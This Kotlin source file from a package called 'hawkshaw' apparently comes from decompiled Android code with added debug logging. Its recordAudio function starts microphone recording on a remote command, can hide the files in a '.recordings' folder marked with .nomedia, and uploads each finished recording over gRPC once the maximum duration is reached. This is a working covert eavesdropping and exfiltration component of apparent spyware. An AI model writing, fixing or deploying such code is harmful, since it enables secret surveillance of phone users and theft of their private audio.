package com.hawkshaw.library.features.media

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.os.Environment
import android.util.Log // Added for logging
import androidx.annotation.RequiresApi
import com.hawkshaw.library.datalayer.models.Command
// FIX: Import the ExceptionsKt object itself, not the specific function as an extension
import com.hawkshaw.library.ktextensions.ExceptionsKt
import com.hawkshaw.library.ktextensions.safeLaunch
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import java.io.File
import java.text.SimpleDateFormat
import java.util.Locale

private const val FILENAME_FORMAT = "yyyy-MM-dd-HH-mm-ss-SSS"
private const val FILE_EXTENSION = ".3gp"
private const val TAG = "RecordAudioKt"

private fun getOutputFile(context: Context, saveToPrivate: Boolean): File {
    Log.d(TAG, "[DEBUG] getOutputFile called. context: $context, saveToPrivate: $saveToPrivate")
    val dir = if (saveToPrivate) {
        Log.d(TAG, "[DEBUG] getOutputFile: saveToPrivate is true. Using private storage.")
        val privateDir = Environment.getExternalStoragePublicDirectory(".recordings") // This seems like an odd choice for "private"
        Log.d(TAG, "[DEBUG] getOutputFile: Fallback privateDir path: ${privateDir.absolutePath}")
        context.getExternalFilesDir(".recordings") ?: privateDir.also {
            Log.d(TAG, "[DEBUG] getOutputFile: Using getExternalFilesDir gave null, falling back to privateDir: ${it.absolutePath}")
            if (!it.exists()) {
                Log.d(TAG, "[DEBUG] getOutputFile: privateDir does not exist. Creating directories.")
                it.mkdirs()
            }
            val noMediaFile = File(it, ".nomedia")
            if (!noMediaFile.exists()){
                Log.d(TAG, "[DEBUG] getOutputFile: Creating .nomedia file at ${noMediaFile.absolutePath}")
                noMediaFile.createNewFile()
            }
        }
    } else {
        Log.d(TAG, "[DEBUG] getOutputFile: saveToPrivate is false. Using public storage.")
        val publicDirName = if (Build.VERSION.SDK_INT >= 31) Environment.DIRECTORY_RECORDINGS else "Recordings"
        Log.d(TAG, "[DEBUG] getOutputFile: Public directory name: $publicDirName")
        Environment.getExternalStoragePublicDirectory(publicDirName).also {
            Log.d(TAG, "[DEBUG] getOutputFile: Public directory path: ${it.absolutePath}")
            if (!it.exists()) {
                Log.d(TAG, "[DEBUG] getOutputFile: Public directory does not exist. Creating directories.")
                it.mkdirs()
            }
        }
    }
    Log.d(TAG, "[DEBUG] getOutputFile: Chosen base directory: ${dir.absolutePath}")

    val outputFileName = SimpleDateFormat(FILENAME_FORMAT, Locale.getDefault())
        .format(System.currentTimeMillis()) + FILE_EXTENSION
    val outputFile = File(dir, outputFileName)
    Log.d(TAG, "[DEBUG] getOutputFile: Final output file path: ${outputFile.absolutePath}")
    return outputFile
}

@RequiresApi(Build.VERSION_CODES.O)
fun recordAudio(context: Context, request: Command.RecordAudioRequest) {
    Log.d(TAG, "[DEBUG] recordAudio called. context: $context, request: $request")

    val mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
        Log.d(TAG, "[DEBUG] recordAudio: SDK >= S. Using MediaRecorder(context).")
        MediaRecorder(context)
    } else {
        Log.d(TAG, "[DEBUG] recordAudio: SDK < S. Using MediaRecorder() [DEPRECATED].")
        @Suppress("DEPRECATION")
        MediaRecorder()
    }
    Log.d(TAG, "[DEBUG] recordAudio: MediaRecorder instance created: $mediaRecorder")

    val outputFile = getOutputFile(context, request.saveToPrivate)
    Log.d(TAG, "[DEBUG] recordAudio: Output file will be: ${outputFile.absolutePath}")

    mediaRecorder.apply {
        Log.d(TAG, "[DEBUG] recordAudio: Configuring MediaRecorder...")
        Log.d(TAG, "[DEBUG] recordAudio: setAudioChannels(${request.audioChannelCount})")
        setAudioChannels(request.audioChannelCount)
        Log.d(TAG, "[DEBUG] recordAudio: setAudioSource(${request.audioSource.toAudioSource()})")
        setAudioSource(request.audioSource.toAudioSource())
        Log.d(TAG, "[DEBUG] recordAudio: setOutputFormat(${request.outputFormat.toOutputFormat()})")
        setOutputFormat(request.outputFormat.toOutputFormat())
        Log.d(TAG, "[DEBUG] recordAudio: setAudioEncoder(${request.audioEncoder.toAudioEncoder()})")
        setAudioEncoder(request.audioEncoder.toAudioEncoder())
        Log.d(TAG, "[DEBUG] recordAudio: setMaxDuration(${request.duration.toInt()})")
        setMaxDuration(request.duration.toInt())
        Log.d(TAG, "[DEBUG] recordAudio: setAudioSamplingRate(${request.audioSampleRate})")
        setAudioSamplingRate(request.audioSampleRate)
        Log.d(TAG, "[DEBUG] recordAudio: setAudioEncodingBitRate(${request.audioBitRate})")
        setAudioEncodingBitRate(request.audioBitRate)
        Log.d(TAG, "[DEBUG] recordAudio: setOutputFile('${outputFile.absolutePath}')")
        setOutputFile(outputFile.absolutePath)
        
        Log.d(TAG, "[DEBUG] recordAudio: Setting OnErrorListener.")
        setOnErrorListener { mr, what, extra ->
            Log.d(TAG, "[DEBUG] MediaRecorder OnErrorListener triggered. What: $what, Extra: $extra, Recorder: $mr")
            Logger.e(
                TAG,
                "Media Recorder Error: What $what, Extra $extra",
                b = false,
                i = 12,
                nothing = null
            ) // Existing log
            Log.d(TAG, "[DEBUG] OnErrorListener: Stopping and releasing MediaRecorder.")
            stop()
            release()
        }
        
        Log.d(TAG, "[DEBUG] recordAudio: Setting OnInfoListener.")
        setOnInfoListener { mr, what, extra ->
            Log.d(TAG, "[DEBUG] MediaRecorder OnInfoListener triggered. What: $what, Extra: $extra, Recorder: $mr")
            Logger.d(TAG, "Media Recorder Info: What $what, Extra $extra", false, 4, null) // Existing log
            if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                Log.d(TAG, "[DEBUG] OnInfoListener: Max duration reached.")
                Log.d(TAG, "[DEBUG] OnInfoListener: Stopping and releasing MediaRecorder.")
                stop()
                release()

                val fileRequest = Command.FileRequest(
                    path = outputFile.path,
                    source = Command.FileRequest.Source.AudioRecording,
                    medium = Command.FileRequest.Medium.Grpc,
                    buffer = 0
                )
                Log.d(TAG, "[DEBUG] OnInfoListener: Created FileRequest: $fileRequest")

                val pushFileCommand = Command(
                    type = Command.CommandType.PushFile,
                    fileRequest = fileRequest
                )
                Log.d(TAG, "[DEBUG] OnInfoListener: Created PushFile Command: $pushFileCommand")

                Log.d(TAG, "[DEBUG] OnInfoListener: Launching coroutine to handleFileCommand.")
                CoroutineScope(Dispatchers.IO).safeLaunch {
                    Log.d(TAG, "[DEBUG] Coroutine for handleFileCommand started.")
                    handleFileCommand(pushFileCommand, null)
                    Log.d(TAG, "[DEBUG] Coroutine for handleFileCommand finished.")
                }
            }
        }
        
        try {
            Log.d(TAG, "[DEBUG] recordAudio: Calling prepare().")
            prepare()
            Log.d(TAG, "[DEBUG] recordAudio: prepare() successful.")
            try {
                Log.d(TAG, "[DEBUG] recordAudio: Calling start().")
                start()
                Log.d(TAG, "[DEBUG] recordAudio: start() successful. Media Recorder Info: Started")
                Logger.d(TAG, "Media Recorder Info: Started", false, 4, null) // Existing log
            } catch (e: Exception) {
                Log.e(TAG, "[DEBUG] recordAudio: Exception during start()", e) // Changed from d to e for consistency
                // FIX: Call logNonFatal via ExceptionsKt object, passing the exception
                ExceptionsKt.logNonFatal(e) // Existing log
                Logger.e(TAG, "RecordAudio failed", b = false, i = 12, nothing = null) // Existing log
            }
        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] recordAudio: Exception during prepare()", e) // Changed from d to e for consistency
            Logger.e(
                TAG,
                "Media Recorder Prepare Error: ${e.message}",
                b = false,
                i = 12,
                nothing = null
            ) // Existing log
            Log.d(TAG, "[DEBUG] recordAudio: Releasing MediaRecorder due to prepare error.")
            release()
        }
    }
    Log.d(TAG, "[DEBUG] recordAudio finished.")
}

